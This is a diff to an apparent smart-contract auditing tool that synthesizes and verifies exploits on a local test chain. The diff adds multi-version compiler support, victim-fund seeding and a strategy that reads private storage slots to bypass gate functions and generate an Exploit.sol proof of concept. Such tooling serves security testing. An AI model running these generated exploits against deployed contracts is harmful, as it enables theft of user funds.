@@ -664,7 +664,7 @@ def scan_target(contract_src, invariants_src, manifest):
 
 STRATEGY_ORDER = [FAM_REENTRANCY, FAM_ACCESS, FAM_INTEGER, FAM_ORACLE, FAM_DELEGATECALL, FAM_RANDOMNESS, FAM_INIT]
 
-HEADER = "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n"
+HEADER = "// SPDX-License-Identifier: MIT\npragma solidity >=0.6.2;\n\n"
 
 
 def seeded_order(order, scores, seed):
@@ -1019,12 +1019,55 @@ def _ensure_solc():
         pass
     solcx.set_solc_version(SOLC)
 
+
+# 컨트랙트의 pragma 에 맞춰 실제 solc 버전을 골라 컴파일한다(멀티버전 백엔드).
+# pre-0.8 레벨(정수 오버·언더플로 등)의 진짜 의미를 재현하기 위함.
+_PATCH = {(0, 4): 26, (0, 5): 17, (0, 6): 12, (0, 7): 6, (0, 8): 28}
+
+def _resolve_solc(spec):
+    spec = (spec or "").strip()
+    mx = re.fullmatch(r"(\d+)\.(\d+)\.(\d+)", spec)   # 정확 핀 (예: 0.8.19)
+    if mx:
+        return tuple(int(x) for x in mx.groups())
+    m = re.search(r"(\d+)\.(\d+)(?:\.(\d+))?", spec)  # 범위 (^0.6.0, >=0.7.0 등)
+    if not m:
+        return (0, 8, 24)
+    major, minor = int(m.group(1)), int(m.group(2))
+    patch = _PATCH.get((major, minor), int(m.group(3) or 0))
+    return (major, minor, patch)
+
+def _solc_for(target_src):
+    """타깃 pragma 로 solc 버전을 정해 설치·설정하고 (버전문자열, evmVersion) 반환."""
+    import solcx
+    os.makedirs(os.environ["SOLCX_BINARY_PATH"], exist_ok=True)
+    m = re.search(r"pragma\s+solidity\s+([^;]+);", target_src or "")
+    ver = _resolve_solc(m.group(1) if m else SOLC)
+    vs = ".".join(str(x) for x in ver)
+    try:
+        installed = [tuple(map(int, str(v).split("."))) for v in solcx.get_installed_solc_versions()]
+    except Exception:
+        installed = []
+    if ver not in installed:
+        try:
+            solcx.install_solc(vs)
+        except Exception:
+            ver = _resolve_solc(SOLC); vs = SOLC       # 실패 시 기본으로 폴백
+    try:
+        solcx.set_solc_version(vs)
+    except Exception:
+        _ensure_solc(); vs = SOLC; ver = (0, 8, 24)
+    evm = "cancun" if ver >= (0, 8, 24) else "istanbul"
+    return vs, evm
+
 def _coerce_args(args, Web3):
     out = []
     for a in args:
         if isinstance(a, str):
             if a.startswith("0x") and len(a) == 42:
                 out.append(Web3.to_checksum_address(a))
+            elif a.startswith("0x") and len(a) > 2:
+                try: out.append(bytes.fromhex(a[2:]))   # bytes32 / bytesN / bytes
+                except Exception: out.append(a)
             elif a.isdigit():
                 out.append(int(a))
             else:
@@ -1080,11 +1123,11 @@ def _verify_attempt(name, target_src, invariants_src, exploit_src, manifest):
     """One EVM run of the harness _prove pipeline. Returns (proven, steps, meta)."""
     import solcx
     from web3 import Web3
-    _ensure_solc()
+    _solcv, _evm = _solc_for(target_src)
     inv_name = infer_invariants_name(invariants_src) or "Invariants"
     files = {f"{name}.sol":target_src, "Invariants_src.sol":invariants_src, "Exploit.sol":exploit_src}
     std = {"language":"Solidity","sources":{k:{"content":v} for k,v in files.items()},
-           "settings":{"evmVersion":EVM_VERSION,
+           "settings":{"evmVersion":_evm,
                        "outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
     compiled = solcx.compile_standard(std, allow_empty=True)
     arts = {}
@@ -1161,10 +1204,10 @@ def _run_effect(name, target_src, exploit_src, manifest):
     (ETH drained, owner() hijacked, debt>collateral). Synthesizes the check in Python."""
     import solcx
     from web3 import Web3
-    _ensure_solc()
+    _solcv, _evm = _solc_for(target_src)
     files = {f"{name}.sol":target_src, "Exploit.sol":exploit_src}
     std = {"language":"Solidity","sources":{k:{"content":v} for k,v in files.items()},
-           "settings":{"evmVersion":EVM_VERSION,
+           "settings":{"evmVersion":_evm,
                        "outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
     compiled = solcx.compile_standard(std, allow_empty=True)
     arts = {}
@@ -1193,6 +1236,14 @@ def _run_effect(name, target_src, exploit_src, manifest):
         target, taddr = deploy(arts[name], cargs, value=0)
     abi = arts[name]["abi"]
     tc = w3.eth.contract(address=taddr, abi=abi)
+    # 타깃이 사용자 자금을 들고 있는 상황을 흉내: 생성자로 시드가 안 들어갔으면
+    # 별도 '피해자' 계정에서 receive/fallback 로 시드를 밀어넣어 본다(가능할 때만).
+    if seed_wei == 0:
+        try:
+            victim = w3.eth.accounts[-1]
+            w3.eth.send_transaction({"from":victim,"to":taddr,"value":DEFAULT_SEED_WEI,"gas":200_000})
+        except Exception:
+            pass
     # pre-snapshot
     b0 = w3.eth.get_balance(taddr)
     o0 = tc.functions.owner().call() if _has_getter(abi,"owner") else None
@@ -1298,7 +1349,7 @@ def _fuzz_codegen(seq, payable_map):
         args=", ".join(_fuzz_lit(t,a) for t,a in zip(c["types"], c["args"]))
         val=f"{{value: {c['value']}}}" if c.get("value") else ""
         calls.append(f"        I(t).{c['name']}{val}({args});")
-    return ("// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n"
+    return ("// SPDX-License-Identifier: MIT\npragma solidity >=0.6.2;\n\n"
             "// Strategy: fuzzed call sequence (template-free) discovered by the agent.\n"
             "interface I {\n"+"\n".join(sigs.values())+"\n}\n\n"
             "contract Exploit {\n"
@@ -1321,11 +1372,11 @@ def _fuzz_search(name, target_src, invariants_src, manifest, do_verify, budget=N
     if budget is None:
         try: budget = int(os.environ.get("TRUST404_FUZZ_BUDGET", "500"))
         except Exception: budget = 500
-    _ensure_solc()
+    _solcv, _evm = _solc_for(target_src)
     files={f"{name}.sol":target_src}
     if do_verify and invariants_src: files["Invariants_src.sol"]=invariants_src
     std={"language":"Solidity","sources":{k:{"content":v} for k,v in files.items()},
-         "settings":{"evmVersion":EVM_VERSION,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+         "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
     compiled=solcx.compile_standard(std, allow_empty=True)
     arts={}
     for _fn,cs in compiled.get("contracts",{}).items():
@@ -1350,6 +1401,12 @@ def _fuzz_search(name, target_src, invariants_src, manifest, do_verify, budget=N
     try: tc,taddr=deploy(arts[name],cargs,value=seed_wei,frm=deployer)
     except Exception:
         seed_wei=0; tc,taddr=deploy(arts[name],cargs,value=0,frm=deployer)
+    if seed_wei == 0:  # 피해자 자금 흉내 (receive/fallback 로 시드)
+        try:
+            victim = accts[-1]
+            w3.eth.send_transaction({"from":victim,"to":taddr,"value":DEFAULT_SEED_WEI,"gas":200_000})
+        except Exception:
+            pass
     abi=arts[name]["abi"]
     inv=None
     if do_verify and invariants_src:
@@ -1438,8 +1495,8 @@ def _synth_reentrancy(target_src):
         b = f["body"]
         # 예치 후보: payable 이고 어떤 원장에 msg.value 를 적립한다. msg.sender 에게
         # 적립하면 무인자 호출, address 인자에게 적립하면 그 인자에 address(this).
-        if f["payable"] and re.search(r"\w+\[[^\]]+\]\s*\+=\s*msg\.value", b):
-            credits_sender = bool(re.search(r"\w+\[\s*msg\.sender\s*\]\s*\+=\s*msg\.value", b))
+        if f["payable"] and re.search(r"\w+\[[^\]]+\]\s*(?:\+=|=)[^;]*msg\.value", b):
+            credits_sender = bool(re.search(r"\w+\[\s*msg\.sender\s*\]\s*(?:\+=|=)[^;]*msg\.value", b))
             addr_args = [an for (t, an) in f["args"] if t == "address"]
             if credits_sender and not f["args"]:
                 deposits.append({"fn": f, "form": "self"})
@@ -1689,6 +1746,140 @@ def _synth_flashloan(target_src, name):
     return out
 
 
+def _storage_attempt(name, target_src, invariants_src, manifest, scan_step, t0):
+    """스토리지 보조 익스플로잇: private 변수를 게이트로 쓰는 함수(예: Vault.unlock
+    (bytes32))에 대해, 배포된 타깃의 스토리지 슬롯을 오프체인으로 읽어(값이 곧 비밀)
+    그 값으로 호출한다. 효과는 자금/권한 외에 '상태 플래그(bool) 반전'도 본다."""
+    import solcx
+    from web3 import Web3
+    _solcv, _evm = _solc_for(target_src)
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try:
+        compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception:
+        return None
+    arts = {}
+    for _f, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts:
+        return None
+    abi = arts[name]["abi"]
+    # 단일 인자(bytes32/uint256/address) 게이트 함수가 없으면 스킵
+    gate_fns = [e for e in abi if e.get("type")=="function"
+                and e.get("stateMutability") not in ("view","pure")
+                and len(e.get("inputs",[]))==1
+                and e["inputs"][0]["type"] in ("bytes32","uint256","address")]
+    if not gate_fns:
+        return None
+    bool_getters = [e["name"] for e in abi if e.get("type")=="function" and not e.get("inputs")
+                    and e.get("stateMutability") in ("view","pure")
+                    and len(e.get("outputs",[]))==1 and e["outputs"][0]["type"]=="bool"]
+    w3, acct = _mk_evm()
+    accts = list(w3.eth.accounts); deployer = accts[1] if len(accts)>1 else acct
+    dep = manifest.get("deploy", {}); cargs = _coerce_args(dep.get("constructor_args", []), Web3)
+    seed_wei = int(str(dep.get("value_wei", str(DEFAULT_SEED_WEI))) or "0")
+    if not _ctor_payable(abi):
+        seed_wei = 0
+    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
+    try:
+        tx = C.constructor(*cargs).transact({"from":deployer,"value":seed_wei,"gas":12_000_000})
+        taddr = w3.eth.wait_for_transaction_receipt(tx).contractAddress
+    except Exception:
+        try:
+            tx = C.constructor(*cargs).transact({"from":deployer,"gas":12_000_000}); seed_wei = 0
+            taddr = w3.eth.wait_for_transaction_receipt(tx).contractAddress
+        except Exception:
+            return None
+    if taddr is None:
+        return None
+    if seed_wei == 0:  # 피해자 자금 흉내
+        try: w3.eth.send_transaction({"from":accts[-1],"to":taddr,"value":DEFAULT_SEED_WEI,"gas":200_000})
+        except Exception: pass
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    inv = None
+    if invariants_src:
+        try:
+            istd = {"language":"Solidity","sources":{"Invariants_src.sol":{"content":invariants_src}},
+                    "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+            ic = solcx.compile_standard(istd, allow_empty=True)
+            iname = infer_invariants_name(invariants_src) or "Invariants"
+            ia = None
+            for _f, cs in ic.get("contracts", {}).items():
+                for cn, c in cs.items():
+                    if cn == iname: ia = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+            if ia:
+                itx = w3.eth.contract(abi=ia["abi"], bytecode=ia["bin"]).constructor().transact({"from":deployer,"gas":9_000_000})
+                iaddr = w3.eth.wait_for_transaction_receipt(itx).contractAddress
+                inv = w3.eth.contract(address=iaddr, abi=ia["abi"])
+        except Exception:
+            inv = None
+    if inv is not None:  # 배포 직후 이미 위반이면 우리 호출로 귀인 불가 → 스킵
+        try:
+            if inv.functions.checkAll(taddr).call()[0] is not True:
+                return None
+        except Exception:
+            return None
+    flags0 = {g: tc.functions[g]().call() for g in bool_getters}
+    # 후보값: 스토리지 슬롯 0..7 + 생성자 인자
+    slots = []
+    for i in range(8):
+        try: slots.append(w3.eth.get_storage_at(taddr, i))
+        except Exception: break
+    tester = w3.provider.ethereum_tester; snap = tester.take_snapshot()
+    def tripped():
+        if inv is not None:
+            r = inv.functions.checkAll(taddr).call()
+            if r[0] is False: return "invariant:" + r[1]
+        for g in bool_getters:
+            if tc.functions[g]().call() != flags0[g]:
+                return f"state flag '{g}' flipped"
+        return None
+    for fn in gate_fns:
+        typ = fn["inputs"][0]["type"]; nm = fn["name"]
+        cand = []
+        for s in slots:
+            if typ == "bytes32": cand.append(s)
+            elif typ == "uint256": cand.append(int.from_bytes(s, "big"))
+            elif typ == "address": cand.append(Web3.to_checksum_address("0x"+s.hex()[-40:]))
+        for a in cargs:  # 우리가 배포에 쓴 값(자체 배포이므로 알고 있음)
+            if typ == "bytes32" and isinstance(a, (bytes, bytearray)) and len(a) == 32: cand.append(bytes(a))
+            if typ == "uint256" and isinstance(a, int): cand.append(a)
+            if typ == "address" and isinstance(a, str) and a.startswith("0x"): cand.append(a)
+        for v in cand:
+            tester.revert_to_snapshot(snap)
+            try:
+                tc.functions[nm](v).transact({"from":acct,"gas":3_000_000})
+            except Exception:
+                continue
+            why = tripped()
+            if why:
+                if typ == "bytes32":
+                    lit = "bytes32(0x" + (v.hex() if isinstance(v,(bytes,bytearray)) else "%064x" % v) + ")"
+                elif typ == "address":
+                    lit = f"address({v})"
+                else:
+                    lit = str(v)
+                poc = (HEADER +
+                    "// Strategy: storage-assisted — a private variable gates this function.\n"
+                    "// The value is read off-chain from the target's storage slot (e.g. via\n"
+                    "// eth_getStorageAt / Foundry vm.load) and submitted here.\n"
+                    "interface ITarget { function " + nm + "(" + typ + ") external; }\n"
+                    "contract Exploit {\n"
+                    "    function run(address t) external payable {\n"
+                    f"        ITarget(t).{nm}({lit});\n"
+                    "    }\n"
+                    "    receive() external payable {}\n"
+                    "}\n")
+                gen = {"step":"generate","title":"Exploit.sol 생성 (storage-assisted)","strategy":"storage","exploit_src":poc}
+                return {"name":name,"proven":True,"firstViolated":why,"strategy":f"storage:{nm}",
+                        "steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+                        "note":"private 스토리지 값을 오프체인으로 읽어 게이트를 통과했습니다.",
+                        "ms":int((time.time()-t0)*1000)}
+    return None
+
+
 def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_step, t0):
     # 0) 재진입 합성: 소스에서 유도한 (예치→인출) 공격 컨트랙트를 하네스로 검증
     try:
@@ -1751,6 +1942,13 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
                         "balance_after_wei":meta.get("balance_after_wei"),
                         "note":"템플릿 미매치 → 시스템 내부 플래시론을 이용한 차용자를 합성해 성립시켰습니다.",
                         "ms":int((time.time()-t0)*1000)}
+    except Exception:
+        pass
+    # 0d) 스토리지 보조 익스플로잇 (private 게이트 — 예: Vault.unlock)
+    try:
+        r = _storage_attempt(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
     except Exception:
         pass
     # 1) 호출 시퀀스 탐색
